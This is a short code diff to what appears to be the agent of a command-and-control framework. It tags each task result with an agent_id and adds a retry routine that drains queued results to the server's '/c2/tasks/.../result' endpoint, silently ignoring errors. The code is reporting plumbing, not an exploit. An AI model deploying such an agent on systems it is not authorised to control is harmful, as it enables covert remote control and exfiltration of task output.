@@ -249,10 +249,33 @@ def _execute_task(task):
 
 def _send_results(server_url, results):
     for r in results:
+        # agent_id must ride on every result post — the server's result route
+        # verifies task ownership against it (403 otherwise).
+        r["agent_id"] = _CONFIG["agent_id"]
         try:
             _post_json(f"{server_url}/c2/tasks/{r['task_id']}/result", r)
         except Exception:
             _queue_result(r)
+
+
+def _drain_queue(server_url):
+    try:
+        if not _QUEUE_PATH.exists():
+            return
+        kept = []
+        for line in _QUEUE_PATH.read_text().splitlines()[:200]:
+            try:
+                item = json.loads(line)
+                item["agent_id"] = _CONFIG["agent_id"]
+                _post_json(f"{server_url}/c2/tasks/{item['task_id']}/result", item)
+            except Exception:
+                kept.append(line)
+        if kept:
+            _QUEUE_PATH.write_text("\n".join(kept))
+        else:
+            _QUEUE_PATH.unlink()
+    except Exception:
+        pass
 
 
 def _heartbeat(server_url, sys_info, results):
